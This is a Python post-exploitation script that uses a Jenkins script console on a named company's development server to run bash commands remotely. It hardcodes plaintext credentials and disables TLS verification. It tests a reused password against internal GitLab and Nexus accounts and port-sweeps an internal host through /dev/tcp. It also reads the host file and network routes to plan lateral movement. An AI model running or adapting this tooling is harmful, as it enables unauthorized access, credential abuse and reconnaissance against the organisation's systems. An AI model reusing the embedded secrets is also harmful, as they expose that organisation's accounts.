import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


# NOTE: inside Groovy """ strings, \$ emits a literal $ to bash (single backslash).

TASK_Q = r'''def r = ["bash","-c","""
echo '===== password reuse: GitLab ====='
for u in cs-jenkins-deployer jenkins jenkins_legacy root; do
  code=\$(curl -sk --max-time 6 -u \"\$u:auroraboreal00\" 'http://gitlab.dev.claroshop.com/api/v4/user' -o /dev/null -w '%{http_code}' 2>/dev/null)
  echo \"gitlab \$u -> \$code\"
done
echo '===== password reuse: Nexus ====='
for u in cs-jenkins-deployer jenkins admin; do
  code=\$(curl -sk --max-time 6 -u \"\$u:auroraboreal00\" 'http://nexus.dev.claroshop.com/service/rest/v1/status' -o /dev/null -w '%{http_code}' 2>/dev/null)
  echo \"nexus \$u -> \$code\"
done
echo '===== gitlab known-good check (jenkis cred) ====='
curl -sk --max-time 6 -u 'jenkins:e6LBqIkOI\$PR1XX2oia' 'http://gitlab.dev.claroshop.com/api/v4/user' 2>/dev/null | head -c 300
"""].execute().text
println r
'''

TASK_R = r'''def r = ["bash","-c","""
echo '===== TCP sweep 172.26.127.196 (OCP .net) ====='
for p in 22 80 443 6443 8443 10250; do
  (exec 3<>/dev/tcp/172.26.127.196/\$p) 2>/dev/null && echo \"\$p OPEN\" || echo \"\$p closed/filtered\"
done
echo '===== /etc/hosts amxnova refs ====='
grep -iE 'amxnova|172.26' /etc/hosts 2>/dev/null
echo '===== routes ====='
ip route 2>/dev/null | grep -E '172.26|default' | head -5
"""].execute().text
println r
'''

TASKS = [
    ("TASK Q: auroraboreal00 reuse on GitLab/Nexus", TASK_Q),
    ("TASK R: OCP 172.26.127.196 port sweep + routes", TASK_R),
]

if __name__ == '__main__':
    for label, script in TASKS:
        print('\n' + '=' * 80)
        print('[*] ' + label)
        print('=' * 80)
        try:
            out = jenkins_exec(script)
            print(out)
        except Exception as e:
            print('[-] ERROR: {}'.format(e))
